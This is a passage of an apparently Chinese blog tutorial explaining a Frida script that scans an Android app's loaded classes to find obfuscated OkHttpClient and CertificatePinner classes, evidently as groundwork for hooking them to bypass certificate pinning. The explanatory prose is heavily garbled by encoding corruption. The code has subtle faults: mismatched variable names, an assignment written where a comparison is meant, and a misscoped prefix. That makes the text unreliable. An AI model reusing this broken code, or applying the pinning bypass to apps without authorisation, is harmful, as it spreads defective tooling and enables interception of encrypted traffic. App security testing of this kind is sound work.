class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">initConsole</span>()</span><br><span class="line">    <span class="title function_">loadOkhttpClient</span>()</span><br><span class="line">    <span class="title function_">loadClasses</span>()</span><br><span class="line">    <span class="title function_">findOkhttpClass</span>()</span><br><span class="line">    <span class="title function_">hook</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><h2 id="initConsole-å¯é€‰"><a href="#initConsole-å¯é€‰" class="headerlink" title="initConsole()-å¯é€‰"></a>initConsole()-å¯é€‰</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">initConsole</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Color</span> = &#123;<span class="attr">RESET</span>: <span class="string">&quot;\x1b[39;49;00m&quot;</span>, <span class="title class_">Black</span>: <span class="string">&quot;0;01&quot;</span>, <span class="title class_">Blue</span>: <span class="string">&quot;4;01&quot;</span>, <span class="title class_">Cyan</span>: <span class="string">&quot;6;01&quot;</span>, <span class="title class_">Gray</span>: <span class="string">&quot;7;11&quot;</span>, <span class="string">&quot;Green&quot;</span>: <span class="string">&quot;2;01&quot;</span>, <span class="title class_">Purple</span>: <span class="string">&quot;5;01&quot;</span>, <span class="title class_">Yellow</span>: <span class="string">&quot;3;01&quot;</span>,  <span class="title class_">Red</span>: <span class="string">&quot;1;01&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">LightColor</span> = &#123;<span class="attr">RESET</span>: <span class="string">&quot;\x1b[39;49;00m&quot;</span>, <span class="title class_">Black</span>: <span class="string">&quot;0;11&quot;</span>, <span class="title class_">Blue</span>: <span class="string">&quot;4;11&quot;</span>, <span class="title class_">Cyan</span>: <span class="string">&quot;6;11&quot;</span>, <span class="title class_">Gray</span>: <span class="string">&quot;7;01&quot;</span>, <span class="string">&quot;Green&quot;</span>: <span class="string">&quot;2;11&quot;</span>, <span class="title class_">Purple</span>: <span class="string">&quot;5;11&quot;</span>, <span class="title class_">Red</span>: <span class="string">&quot;1;11&quot;</span>, <span class="title class_">Yellow</span>: <span class="string">&quot;3;11&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">var</span> colorPrefix = <span class="string">&#x27;\x1b[3&#x27;</span></span><br><span class="line">    <span class="keyword">var</span> colorSuffix = <span class="string">&#x27;m&#x27;</span></span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Color</span>).<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">c</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (c  == <span class="string">&quot;RESET&quot;</span>) </span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="variable language_">console</span>[c] = <span class="keyword">function</span>(<span class="params">message</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(colorPrefix + <span class="title class_">Color</span>[c] + colorSuffix + message + <span class="title class_">Color</span>.<span class="property">RESET</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">console</span>[<span class="string">&quot;Light&quot;</span> + c] = <span class="keyword">function</span>(<span class="params">message</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(colorPrefix + <span class="title class_">LightColor</span>[c] + colorSuffix + message + <span class="title class_">Color</span>.<span class="property">RESET</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°initConsoleçš„ä½œç”¨æ˜¯æ‰©å±•JavaScriptçš„consoleå¯¹è±¡ï¼Œä½¿å¾—èƒ½å¤Ÿ<strong>åœ¨æ§åˆ¶å°ä¸­è¾“å‡ºå¸¦æœ‰é¢œè‰²çš„æ–‡æœ¬</strong>ã€‚å®ƒé€šè¿‡å®šä¹‰ä¸€ä¸ªColorå¯¹è±¡å’Œä¸€ä¸ªLightColorå¯¹è±¡æ¥åŒ…å«ANSIè½¬ä¹‰ä»£ç ï¼Œè¿™äº›ä»£ç ç”¨äºè®¾ç½®ç»ˆç«¯ä¸­çš„æ–‡æœ¬é¢œè‰²å’Œæ ·å¼ã€‚</p><p>å…·ä½“æ¥è¯´ï¼Œè¿™ä¸ªå‡½æ•°åšäº†ä»¥ä¸‹å‡ ä»¶äº‹æƒ…ï¼š</p><ol><li>å®šä¹‰äº†ä¸€ä¸ªColorå¯¹è±¡ï¼ŒåŒ…å«äº†é»˜è®¤çš„å‰æ™¯è‰²ï¼ˆæ–‡æœ¬é¢œè‰²ï¼‰å’ŒèƒŒæ™¯è‰²ï¼Œä»¥åŠä¸€äº›åŸºæœ¬çš„æ–‡æœ¬é¢œè‰²ä»£ç ï¼Œå¦‚é»‘ã€è“ã€ç»¿ç­‰ã€‚</li><li>å®šä¹‰äº†ä¸€ä¸ªLightColorå¯¹è±¡ï¼ŒåŒ…å«äº†ä¸Colorç›¸åŒçš„é¢œè‰²ï¼Œä½†æ˜¯è¿™äº›é¢œè‰²æ˜¯äº®è‰²çš„ç‰ˆæœ¬ã€‚</li><li>å®šä¹‰äº†colorPrefixå’ŒcolorSuffixå˜é‡ï¼Œè¿™ä¸¤ä¸ªå˜é‡ç”¨äºæ„é€ ANSIè½¬ä¹‰ä»£ç ï¼Œç”¨äºåœ¨ç»ˆç«¯ä¸­è®¾ç½®æ–‡æœ¬é¢œè‰²ã€‚</li><li>ä½¿ç”¨Object.keys(Color)è·å–Colorå¯¹è±¡çš„æ‰€æœ‰é”®ï¼ˆé¢œè‰²åï¼‰ï¼Œç„¶åä½¿ç”¨forEachéå†è¿™äº›é”®ã€‚</li><li>å¯¹äºæ¯ä¸ªé¢œè‰²åï¼ˆé™¤äº†â€RESETâ€ï¼‰ï¼Œè¿™ä¸ªå‡½æ•°ä¼šä¸ºconsoleå¯¹è±¡æ·»åŠ ä¸¤ä¸ªæ–°æ–¹æ³•ï¼šä¸€ä¸ªç”¨äºæ™®é€šé¢œè‰²ï¼Œä¸€ä¸ªç”¨äºäº®è‰²ã€‚ä¾‹å¦‚ï¼Œå¦‚æœé¢œè‰²åæ˜¯â€Redâ€ï¼Œåˆ™æ·»åŠ console.Redå’Œconsole.LightRedä¸¤ä¸ªæ–¹æ³•ã€‚</li><li>å½“è¿™äº›æ–°æ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œå®ƒä»¬ä¼šä½¿ç”¨ç›¸åº”çš„ANSIè½¬ä¹‰ä»£ç æ¥è®¾ç½®æ–‡æœ¬é¢œè‰²ï¼Œç„¶åæ‰“å°ä¼ å…¥çš„æ¶ˆæ¯ï¼Œæœ€åå°†é¢œè‰²é‡ç½®ä¸ºé»˜è®¤ã€‚</li></ol><p>é€šè¿‡è°ƒç”¨initConsole()ï¼Œä½ å¯ä»¥åœ¨æ§åˆ¶å°ä¸­ä½¿ç”¨å¦‚console.Red(â€œError messageâ€)çš„æ–¹å¼æ¥è¾“å‡ºçº¢è‰²æ–‡æœ¬ï¼Œæˆ–è€…ä½¿ç”¨console.LightGreen(â€œInfo messageâ€)æ¥è¾“å‡ºäº®ç»¿è‰²æ–‡æœ¬ã€‚è¿™æœ‰åŠ©äºåœ¨æ—¥å¿—è¾“å‡ºä¸­åŒºåˆ†ä¸åŒçš„ä¿¡æ¯çº§åˆ«æˆ–ç±»å‹ã€‚</p><h2 id="loadOkhttpClient"><a href="#loadOkhttpClient" class="headerlink" title="loadOkhttpClient()"></a>loadOkhttpClient()</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æå‰åŠ è½½okhttpclientï¼Œä¸ç„¶spawnçš„æ—¶å€™ä¼šæŠ¥é”™</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadOkhttpClient</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;Okhttps.OkhttpClient&quot;</span>)  <span class="comment">//è¿™å—ç±»åæ··æ·†åçš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥è¿è¡Œä»£ç åä¿å­˜åï¼Œä¿®æ”¹å‚æ•°ï¼Œé‡æ–°åŠ è½½</span></span><br><span class="line">        &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(e)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>loadOKhttpClient(ï¼‰å‡½æ•°çš„ä¸»è¦ä½œç”¨æ˜¯åœ¨å¼€å§‹Hookå‰ï¼Œå°±åŠ è½½â€Okhttps.OkhttpClientâ€ã€‚</p><p>é˜²æ­¢é€šè¿‡spawnæ–¹æ³•åŠ è½½è„šæœ¬çš„æ—¶å€™ï¼Œæ²¡æœ‰å®Œå…¨åŠ è½½è¿›å»æ‰€æœ‰çš„ç±»ï¼Œå¯¼è‡´è„šæœ¬æŠ¥é”™ã€‚</p><p><code>Java.use(&quot;Okhttps.OkhttpClient&quot;) </code> é‡Œé¢çš„å‚æ•°ï¼Œæ ¹æ®ä¸‹é¢<code>findOkhttpClass()</code>å‡½æ•°çš„å®é™…æƒ…å†µè¿›è¡Œä¿®æ”¹ã€‚</p><h2 id="loadClasses"><a href="#loadClasses" class="headerlink" title="loadClasses()"></a>loadClasses()</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å®šä¹‰ä¸€ä¸ªæ•°ç»„ï¼Œéå†å†…å­˜ä¸­çš„æ‰€æœ‰ç±»ï¼Œå°†æ‰€æœ‰ç±»åæ”¾å…¥æ•°ç»„ä¸­ã€‚</span></span><br><span class="line"><span class="keyword">var</span> classNames = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadClasses</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">clasName,handle</span>)&#123;</span><br><span class="line">                classNames.<span class="title function_">push</span>(clasName)</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Search classes complete!&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½œç”¨ï¼šè°ƒç”¨<code>frida</code> çš„ <code>API</code> <code>&quot;Java.enumerateClassLoaders&quot; </code>éå†å†…å­˜ä¸­æ‰€æœ‰çš„ç±»ï¼Œå¹¶å°†è¿™äº›ç±»æ”¾åˆ°æ•°ç»„ä¸­æ–¹ä¾¿åé¢è°ƒç”¨ã€‚</p><h2 id="findOkhttpClass-å…³é”®"><a href="#findOkhttpClass-å…³é”®" class="headerlink" title="findOkhttpClass()-å…³é”®"></a>findOkhttpClass()-å…³é”®</h2><p>æ‰¾åˆ°å†…å­˜ä¸­çš„ â€œ<strong>OkhttpClient</strong>â€œ å’Œ â€œ<strong>CertificatePinner</strong>â€œ ç±»ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å®šä¹‰äº†ä¸‰ä¸ªå˜é‡ï¼Œèµ‹å€¼ä¸ºç©º</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">OkhttpClinetClassName</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">CertificatePinnerClassName</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">var</span> perfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findOkhttpClass</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Modifier</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.reflect.Modifier&quot;</span>)  <span class="comment">//Modifieræ˜¯åå°„æ¡†æ¶æä¾›çš„ä¸€ä¸ªç±»ï¼Œå¯ä»¥åˆ¤æ–­å½“å‰è¿™ä¸ªç±»çš„ä¸€äº›å±æ€§ï¼Œå¦‚finalã€staticç­‰</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°isOkhttpClientï¼Œä¼ å…¥å‚æ•°ä¸ºç±»åclsName</span></span><br><span class="line">        <span class="comment">//ä½œç”¨ï¼šè·å–åˆ°ç»è¿‡æ··æ·†åçš„OkhttpClientç±»å</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">isOkhttpClient</span>(<span class="params">clsName</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(clsName.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="property">length</span> != <span class="number">2</span>)&#123;  <span class="comment">//åˆ¤æ–­ç±»åé•¿åº¦å¿…é¡»ä¸º2</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> cls = <span class="title class_">Java</span>.<span class="title function_">use</span>(clsName)</span><br><span class="line">                <span class="keyword">var</span> interfaces = cls.<span class="property">class</span>.<span class="title function_">getInterfaces</span>() <span class="comment">//é€šè¿‡åå°„è·å–å½“å‰ç±»çš„æ¥å£</span></span><br><span class="line">                <span class="keyword">const</span> count = interfaces.<span class="property">length</span>  <span class="comment">//æ¥å£æ•°é‡</span></span><br><span class="line">                <span class="keyword">if</span>(count &lt; <span class="number">2</span>)&#123;    <span class="comment">//OkhttpClientç±»ç»§æ‰¿çš„æ¥å£æ•°é‡è¦æ±‚å¤§äºç­‰äº2</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">var</span> flag = <span class="literal">false</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; count; i++)&#123;</span><br><span class="line">                    <span class="keyword">var</span> interface_ = interfaces[i]</span><br><span class="line">                    <span class="keyword">var</span> interface_name = interface_.<span class="title function_">getName</span>()  <span class="comment">//éå†è·å¾—OkhttpClientç±»ç»§æ‰¿çš„æ¥å£</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span>(interface_name.<span class="title function_">indexOf</span>(<span class="string">&quot;Cloneable&quot;</span>) &gt; <span class="number">0</span>)&#123;   <span class="comment">//æ¥å£åç§°åŒ…å«&quot;Cloneable&quot;ã€‚è¿™å—cloneableæ˜¯OKhttpclientç±»å®ç°çš„ä¸€ä¸ªæ¥å£</span></span><br><span class="line">                        flag = <span class="literal">true</span></span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span>(interface_name.<span class="title function_">indexOf</span>(<span class="string">&quot;$&quot;</span>) &lt;= <span class="number">0</span>)&#123;   <span class="comment">//åˆ¤æ–­å½“å‰æ¥å£æ˜¯å¦æ˜¯å†…éƒ¨ç±»ï¼Œå¦‚æœä¸æ˜¯è¿”å›false</span></span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(!flag) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//å¦‚æœåœ¨éå†è¿‡ç¨‹ä¸­æ²¡æœ‰æ‰¾åˆ°åŒ…å«&quot;Cloneable&quot;çš„æ¥å£ï¼Œå‡½æ•°è¿”å›falseã€‚</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">getDeclaredClasses</span>().<span class="property">length</span> &lt; <span class="number">1</span>)&#123; <span class="comment">//æ£€æŸ¥è¿™ä¸ªç±»è‡³å°‘åŒ…å«ä¸€ä¸ªå†…éƒ¨ç±»ï¼Œå¦‚æœæ²¡æœ‰è¿”å›false</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">getSuperclass</span>().<span class="title function_">getName</span>() != <span class="string">&#x27;java.lang.Object&#x27;</span>)&#123; <span class="comment">//å› ä¸ºOkhttpClientè¿™ä¸ªç±»çš„æ²¡æœ‰çˆ¶ç±»ï¼Œæ‰€ä»¥é»˜è®¤ä»–çš„çˆ¶ç±»ä¸º Object</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="comment">///å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°isCertificatePinner</span></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">isCertificatePinner</span>(<span class="params">clsName,prefix</span>)&#123;      </span><br><span class="line">            <span class="keyword">if</span>(!clsName.<span class="title function_">startsWith</span>(prefix))&#123;  <span class="comment">//æ£€æŸ¥ä¿å¯†æ˜¯å¦ä»¥prefixä½å‰ç¼€ï¼Œè‹¥ä¸æ˜¯è¿”å›false</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(clsName.<span class="title function_">indexOf</span>(<span class="string">&quot;$&quot;</span>) &gt; <span class="number">0</span>)&#123;  <span class="comment">//åˆ¤æ–­å½“å‰ç±»æ˜¯å¦æ˜¯å†…éƒ¨ç±»ï¼Œå¦‚æœæ˜¯è¿”å›false</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(clsName.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="property">length</span> != <span class="number">2</span>)&#123;  <span class="comment">//åˆ¤æ–­å½“å‰ç±»ä»¥&quot;.&quot;åˆ†å‰²åï¼Œé•¿åº¦æ˜¯å¦ä¸º2ï¼Œå¦‚æœä¸æ˜¯è¿”å›false</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> cls = <span class="title class_">Java</span>.<span class="title function_">use</span>(clsName)</span><br><span class="line">            <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">isInterface</span>())&#123;  <span class="comment">//åˆ¤æ–­å½“å‰ç±»æ˜¯å¦æ˜¯æ¥å£ï¼Œå¦‚æœæ˜¯è¿”å›false</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">getInterfaces</span>().<span class="property">length</span> &gt; <span class="number">0</span>)&#123;   <span class="comment">//åˆ¤æ–­å½“å‰ç±»æ˜¯å¦æœ‰æ¥å£ï¼Œå¦‚æœæœ‰è¿”å›false</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">         </span><br><span class="line">            <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">getDeclaredClasses</span>().<span class="property">length</span> = <span class="number">0</span>)&#123; <span class="comment">//åˆ¤æ–­å½“å‰ç±»ä¸­å†…éƒ¨ç±»çš„ä¸ªæ•°ï¼Œå¦‚æœæ²¡æœ‰è¿”å›false</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">getSuperclass</span>().<span class="title function_">getName</span>() != <span class="string">&quot;java.lang.Object&quot;</span>)&#123;  <span class="comment">//åˆ¤æ–­å½“å‰ç±»æ˜¯å¦ç»§æ‰¿äº†Objectç±»ï¼Œå¦‚æœæ²¡æœ‰è¿”å›false</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!<span class="title class_">Modifier</span>.<span class="title function_">isFinal</span>(cls.<span class="property">class</span>.<span class="title function_">getModifiers</span>()))&#123; <span class="comment">//åˆ¤æ–­å½“å‰ç±»æ˜¯å¦æ˜¯finalä¿®é¥°çš„ï¼Œå¦‚æœæ˜¯è¿”å›false</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> flag = <span class="literal">false</span></span><br><span class="line">            <span class="keyword">var</span> methods = cls.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>()  <span class="comment">//è·å–å½“å‰ç±»çš„æ‰€æœ‰æ–¹æ³•</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; methods.<span class="property">length</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">var</span> method = methods[i]</span><br><span class="line">                <span class="keyword">if</span>(method.<span class="title function_">getParameterCount</span>() &lt; <span class="number">1</span>)&#123;  <span class="comment">//åˆ¤æ–­å½“å‰æ–¹æ³•æ˜¯å¦æœ‰å‚æ•°ï¼Œå¦‚æœæ²¡æœ‰åˆ™continue</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(method.<span class="title function_">getParameterTypes</span>()[<span class="number">0</span>].<span class="title function_">getName</span>() == <span class="string">&quot;java.security.cert.Certificate&quot;</span>)&#123; <span class="comment">//åˆ¤æ–­å½“å‰æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°ç±»å‹æ˜¯å¦æ˜¯Certificateç±»å‹</span></span><br><span class="line">                    flag = <span class="literal">true</span> <span class="comment">//å¦‚æœæœ‰æ–¹æ³•å‚æ•°ä¸ºCertificateç±»å‹ï¼Œé‚£ä¹ˆå°±è®¤ä¸ºæ˜¯okhttp3.CertificatePinnerç±»</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!flag) <span class="keyword">return</span> <span class="literal">false</span>  <span class="comment">//å¦‚æœæ²¡æœ‰æ–¹æ³•å‚æ•°ä¸ºCertificateç±»å‹ï¼Œé‚£ä¹ˆå°±è®¤ä¸ºä¸æ˜¯okhttp3.CertificatePinnerç±»</span></span><br><span class="line"></span><br><span class="line">            flag = <span class="literal">false</span></span><br><span class="line">            <span class="keyword">var</span> fields = cls.<span class="property">class</span>.<span class="title function_">getDeclaredFields</span>()   <span class="comment">//é€šè¿‡åå°„è·å–ç±»çš„æ‰€æœ‰å£°æ˜å­—æ®µã€‚è¿™äº›å­—æ®µåŒ…æ‹¬ç§æœ‰ã€ä¿æŠ¤ã€é»˜è®¤ï¼ˆåŒ…ï¼‰è®¿é—®çº§åˆ«çš„å­—æ®µï¼Œä½†ä¸åŒ…æ‹¬ç»§æ‰¿çš„å­—æ®µ</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> k = <span class="number">0</span>; k &lt; fields.<span class="property">length</span>; k++)&#123;</span><br><span class="line">                <span class="keyword">var</span> field = fields[k];</span><br><span class="line">                <span class="keyword">if</span>(field.<span class="title function_">getType</span>().<span class="title function_">getName</span>() == <span class="string">&quot;java.util.Set&quot;</span>)&#123;  <span class="comment">//æ£€æŸ¥å½“å‰å­—æ®µçš„ç±»å‹æ˜¯å¦æ˜¯é›†åˆ(java.util.Set)</span></span><br><span class="line">                    flag = <span class="literal">true</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!flag) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//forå¾ªç¯ï¼Œè°ƒç”¨isOkhttpClientæ–¹æ³•ï¼Œæ‰¾åˆ°OkhttpClientè¿™ä¸ªç±»</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; classesNames.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_">isOkhttpClient</span>(classesNames[i]))&#123;</span><br><span class="line">                <span class="title class_">OkhttpClientClassName</span> = classesNames[i]</span><br><span class="line">                <span class="comment">//è·å–OkhttpClinetClassNameç±»çš„å‰ç¼€ï¼Œæ¯”å¦‚okhttp3.OkHttpClientï¼Œå¾—åˆ°äº†okhttp3.</span></span><br><span class="line">                <span class="keyword">var</span> prefix = classesNames[i].<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]+<span class="string">&#x27;.&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//forå¾ªç¯ï¼Œè°ƒç”¨isCertificatePinneræ–¹æ³•ï¼Œæ‰¾åˆ°isCertificatePinnerç±»</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; classesNames.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_">isCertificatePinner</span>(classesNames[i],prefix))&#123;</span><br><span class="line">                <span class="title class_">CertificatePinnerClassName</span> = classesNames[i]</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> printOut</span><br><span class="line">        <span class="keyword">if</span>(<span class="title class_">OkhttpClientClassName</span> == <span class="string">&quot;&quot;</span> || <span class="title class_">CertificatePinnerClassName</span> == <span class="string">&quot;&quot;</span> || prefix == <span class="string">&quot;&quot;</span>)&#123; <span class="comment">//å¦‚æœæ²¡æœ‰æ‰¾åˆ°okhttp3.OkHttpClientç±»å’Œokhttp3.CertificatePinnerç±»ï¼Œé‚£ä¹ˆå°±è¿”å›false</span></span><br><span class="line">            printOut = <span class="variable language_">console</span>.<span class="property">Red</span></span><br><span class="line">            <span class="title function_">printOut</span>(<span class="string">&quot;Can&#x27;t find the okhttp class&quot;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            printOut = <span class="variable language_">console</span>.<span class="property">Green</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//æ‰“å°ç›¸å…³å­—æ®µï¼Œå¦‚ç±»åå‰ç¼€ã€OkhttpClientç±»ã€OkhttpCertificatePinnerç±»</span></span><br><span class="line">        <span class="title function_">printOut</span>(<span class="string">&quot;Found Class: &quot;</span>+classesNames.<span class="property">length</span>)</span><br><span class="line">        <span class="title function_">printOut</span>(<span class="string">&quot;Okhttp&#x27;s package prefix: &quot;</span>+prefix)</span><br><span class="line">        <span class="title function_">printOut</span>(<span class="string">&quot;Found the OkhttpClient: &quot;</span>+<span class="title class_">OkhttpClientClassName</span>)</span><br><span class="line">        <span class="title function_">printOut</span>(<span class="string">&quot;Found the OkhttpCertificatePinner: &quot;</span>+<span class="title class_">CertificatePinnerClassName</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1ã€é¦–å…ˆï¼Œå®šä¹‰äº†ä¸€ä¸ª åå°„ç±»<code>Modifier</code>,è¯¥ç±»æ˜¯åå°„æ¡†æ¶æä¾›çš„ä¸€ä¸ªç±»ï¼Œå¯ä»¥åˆ¤æ–­å½“å‰è¿™ä¸ªç±»çš„ä¸€äº›å±æ€§ï¼Œå¦‚finalã€staticç­‰</p><p>2ã€å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°<code>isOkhttpClient</code>ï¼Œä¼ 